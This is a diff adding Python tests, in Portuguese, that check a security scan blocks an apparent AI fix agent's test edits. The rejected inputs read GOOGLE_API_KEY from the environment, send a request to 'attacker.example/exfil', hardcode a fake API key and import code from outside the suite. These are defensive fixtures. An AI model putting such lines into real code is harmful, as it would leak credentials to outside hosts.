@@ -245,6 +245,109 @@ def test_code_fix_rejeita_manipulacao_de_sys_path(monkeypatch, tmp_path: Path):
     assert test_file.read_text(encoding="utf-8") == original
 
 
+def _preparar_teste_existente(monkeypatch, tmp_path: Path) -> tuple[Path, str]:
+    workspace = tmp_path / "workspace"
+    monkeypatch.setenv("WORKSPACE_OUTPUT_DIR", str(workspace))
+    test_file = (
+        workspace / "tests" / "inputs" / "rf_test_001" / "test_rf_test_001.py"
+    )
+    test_file.parent.mkdir(parents=True)
+    original = "def test_original():\n    assert True\n"
+    test_file.write_text(original, encoding="utf-8")
+    return test_file, original
+
+
+def test_code_fix_rejeita_correcao_com_leitura_de_ambiente(monkeypatch, tmp_path: Path):
+    """P6.1: write_qa_test agora passa pela mesma varredura P3 que
+    receber_requisitos usa — uma correção do code_fix_agent não pode
+    introduzir leitura de variável de ambiente sem ser barrada."""
+    test_file, original = _preparar_teste_existente(monkeypatch, tmp_path)
+
+    from shared.tools.qa_test_files import write_qa_test
+
+    result = write_qa_test(
+        "tests/inputs/rf_test_001/test_rf_test_001.py",
+        "import os\n\n"
+        "def test_invalido():\n"
+        "    assert os.environ.get('GOOGLE_API_KEY') is not None\n",
+    )
+
+    assert result["status"] == "erro"
+    assert "risco de segurança" in result["erro"]
+    assert test_file.read_text(encoding="utf-8") == original
+
+
+def test_code_fix_rejeita_correcao_com_rede_externa(monkeypatch, tmp_path: Path):
+    test_file, original = _preparar_teste_existente(monkeypatch, tmp_path)
+
+    from shared.tools.qa_test_files import write_qa_test
+
+    result = write_qa_test(
+        "tests/inputs/rf_test_001/test_rf_test_001.py",
+        "import requests\n\n"
+        "def test_invalido():\n"
+        "    requests.get('https://attacker.example/exfil')\n",
+    )
+
+    assert result["status"] == "erro"
+    assert "risco de segurança" in result["erro"]
+    assert test_file.read_text(encoding="utf-8") == original
+
+
+def test_code_fix_rejeita_correcao_com_credencial_hardcoded(monkeypatch, tmp_path: Path):
+    test_file, original = _preparar_teste_existente(monkeypatch, tmp_path)
+
+    from shared.tools.qa_test_files import write_qa_test
+
+    result = write_qa_test(
+        "tests/inputs/rf_test_001/test_rf_test_001.py",
+        "def test_invalido():\n"
+        "    api_key = \"sk-proj-abc123xyz789real\"\n"
+        "    assert api_key\n",
+    )
+
+    assert result["status"] == "erro"
+    assert "risco de segurança" in result["erro"]
+    assert test_file.read_text(encoding="utf-8") == original
+
+
+def test_code_fix_rejeita_import_de_fora_da_suite(monkeypatch, tmp_path: Path):
+    """Regra de isolamento do prompt do code_fix_agent ('nunca referencie
+    workspace_output/coder') agora tem backstop de código via
+    detectar_riscos_codigo."""
+    test_file, original = _preparar_teste_existente(monkeypatch, tmp_path)
+
+    from shared.tools.qa_test_files import write_qa_test
+
+    result = write_qa_test(
+        "tests/inputs/rf_test_001/test_rf_test_001.py",
+        "from workspace_output.coder.src.checkout import calculate\n\n"
+        "def test_invalido():\n"
+        "    assert calculate() == 5\n",
+    )
+
+    assert result["status"] == "erro"
+    assert "risco de segurança" in result["erro"]
+    assert test_file.read_text(encoding="utf-8") == original
+
+
+def test_code_fix_aceita_correcao_limpa(monkeypatch, tmp_path: Path):
+    """Caminho feliz: correção sem nenhum risco continua sendo aplicada
+    normalmente (sem regressão do comportamento pré-P6)."""
+    test_file, _original = _preparar_teste_existente(monkeypatch, tmp_path)
+
+    from shared.tools.qa_test_files import write_qa_test
+
+    novo_conteudo = "def test_corrigido():\n    assert 1 + 1 == 2\n"
+    result = write_qa_test(
+        "tests/inputs/rf_test_001/test_rf_test_001.py",
+        novo_conteudo,
+    )
+
+    assert result["status"] == "aplicado"
+    assert test_file.read_text(encoding="utf-8") == novo_conteudo
+
+
 def test_code_fix_nao_cria_teste_ausente(monkeypatch, tmp_path: Path):
     workspace = tmp_path / "workspace"
     monkeypatch.setenv("WORKSPACE_OUTPUT_DIR", str(workspace))
